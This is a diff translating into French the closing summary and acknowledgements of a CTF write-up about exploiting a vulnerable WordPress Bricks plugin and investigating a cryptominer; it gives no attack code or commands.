-Through this room, I understood how easily certain vulnerabilities can be exploited especially when using a vulnerable service/plugin. It also helped me to get more practical knowledge in Web Penetration testing (Wordpress atleast).
+Cette room concernait l'exploitation d'un site web WordPress vulnérable via un plugin/thème WordPress (Bricks) vulnérable et non mis à jour. Après avoir obtenu un RCE sur la machine cible, nous avons obtenu des identifiants (inutiles pour le challenge, d'ailleurs), nous avons également dû trouver un processus suspect (définiment un malware de cryptominage) et enquêter à son sujet (logs, adresses Bitcoin, recherche sur des adresses Bitcoin).
 
-## Acknowledgements
+À travers cette room, j'ai compris à quel point certaines vulnérabilités peuvent être facilement exploitées, surtout lorsqu'on utilise un service/plugin vulnérable. Cela m'a également aidé à acquérir plus de connaissances pratiques en tests de pénétration web (WordPress au moins).
 
-If you’ve made it this far — thank you! Sharing knowledge is what makes the CTF community truly awesome.
+## Remerciements
 
-I hope this write-up was helpful or at least interesting. And remember:
+Si vous êtes arrivé jusqu'ici — merci ! Le partage de connaissances est ce qui rend la communauté CTF vraiment géniale.
 
-<div align="center">
-    <i>Every vulnerability is a lesson in disguise — the more we break, the more we understand how to build.</i>
-</div>
+J'espère que ce write-up a été utile ou au moins intéressant. Et n'oubliez pas :
+
+*Every vulnerability is a lesson in disguise — the more we break, the more we understand how to build.*
